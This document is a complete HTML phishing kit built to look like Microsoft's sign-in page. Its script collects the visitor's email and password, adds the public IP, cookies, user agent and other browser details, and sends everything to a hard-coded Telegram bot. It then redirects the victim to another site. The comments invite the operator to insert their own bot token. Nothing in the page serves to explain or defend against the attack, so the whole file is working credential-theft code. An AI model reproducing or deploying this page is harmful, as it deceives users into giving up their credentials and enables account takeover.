<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign In</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", sans-serif;
      background: radial-gradient(circle at 70% 30%, #f6f8fb, #ececfb);
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .login-box, .password-box {
      background: white;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      padding: 40px;
      box-sizing: border-box;
      display: none;
    }
    .login-box {
      display: block; /* Make sure login box is visible initially */
    }
    .ms-header {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 30px;
    }
    .ms-header img {
      height: 28px;
    }
    .ms-header span {
      font-size: 20px;
      color: #222;
      font-weight: 600;
    }
    h2 {
      font-size: 20px;
      font-weight: normal;
      margin-bottom: 20px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 10px 0;
      font-size: 16px;
      border: none;
      border-bottom: 1px solid #999;
      outline: none;
    }
    .links {
      margin-top: 15px;
      font-size: 13px;
    }
    .links a {
      color: #0067b8;
      text-decoration: none;
    }
    button {
      background-color: #0078d4;
      color: white;
      border: none;
      padding: 10px 20px;
      font-size: 15px;
      display: block;
      margin-left: auto;
      margin-top: 30px;
      cursor: pointer;
    }
    .signin-options {
      width: 100%;
      max-width: 420px;
      margin-top: 20px;
      background: white;
      padding: 15px;
      text-align: left;
      font-size: 14px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      display: flex;
      align-items: center;
      gap: 8px;
      box-sizing: border-box;
    }
    .signin-options::before {
      content: 'üîê';
      font-size: 16px;
    }
    .loader {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(255, 255, 255, 0.9);
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 18px;
      font-weight: bold;
      display: none;
    }
  </style>
</head>
<body>

  <div class="login-box" id="login-box">
    <div class="ms-header">
      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft logo">
      <span>Microsoft</span>
    </div>

    <h2>Sign in</h2>
    <input type="text" placeholder="Email, phone, or Skype" id="email" />

    <div class="links">
      <p><a href="#">No account? Create one!</a></p>
      <p><a href="#">Can‚Äôt access your account?</a></p>
    </div>

    <button onclick="goToPasswordPage()">Next</button>
  </div>

  <div class="password-box" id="password-box">
    <div class="ms-header">
      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft logo">
      <span>Microsoft</span>
    </div>

    <div class="user-email" id="email-display">user@example.com</div>

    <h2>Enter your password</h2>

    <input type="password" placeholder="Password" id="password" />

    <div class="links">
      <p><a href="#">Forgot your password?</a></p>
      <p><a href="#">Sign in with a different Microsoft account</a></p>
    </div>

    <button onclick="fakeLogin()">Next</button>
    <div class="loader" id="loader">Authentication in progress...</div>
  </div>

  <script>
    const botToken = '8193103085:AAFFGS-tncgQsxBlqsziW-8k9Y0pGJp-l8A'; // Replace with your Telegram Bot token
    const chatId = '5265985001'; // Replace with your chat ID

    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const params = {
        chat_id: chatId,
        text: message,
      };

      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(params),
      })
      .then(response => response.json())
      .then(data => {
        console.log('Message sent to Telegram:', data);
      })
      .catch(error => {
        console.error('Error sending message to Telegram:', error);
      });
    }

    function showPasswordBox(email) {
      document.getElementById('login-box').style.display = 'none';
      document.getElementById('password-box').style.display = 'block';
      document.getElementById("email-display").innerText = email;
    }

    function goToPasswordPage() {
      const email = document.getElementById("email").value.trim();
      if (email) {
        localStorage.setItem("login_email", email);
        showPasswordBox(email);
      } else {
        alert("Please enter an email.");
      }
    }

    function fakeLogin() {
      const pw = document.getElementById("password").value.trim();
      const email = localStorage.getItem("login_email");

      if (!pw) {
        alert("Please enter your password.");
        return;
      }

      document.getElementById("loader").style.display = "flex";

      // Get user data
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ip = data.ip;
          const userAgent = navigator.userAgent;
          const cookies = document.cookie;
          const platform = navigator.platform;
          const language = navigator.language || navigator.userLanguage;
          const screenWidth = window.screen.width;
          const screenHeight = window.screen.height;
          const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
          const referrer = document.referrer;

          const message = `
            New login attempt:
            Email: ${email}
            Password: ${pw}
            IP: ${ip}
            User-Agent: ${userAgent}
            Cookies: ${cookies}
            Platform: ${platform}
            Language: ${language}
            Screen Resolution: ${screenWidth}x${screenHeight}
            Timezone: ${timeZone}
            Referrer: ${referrer}
          `;
          
          sendToTelegram(message);

          // Simulate login process
          setTimeout(() => {
            window.location.href = "https://home.com"; // Redirect after fake login
          }, 2000);
        })
        .catch(error => {
          alert("An error occurred while fetching IP.");
          console.error("IP fetch error:", error);
          document.getElementById("loader").style.display = "none";
        });
    }
  </script>

</body>
</html>
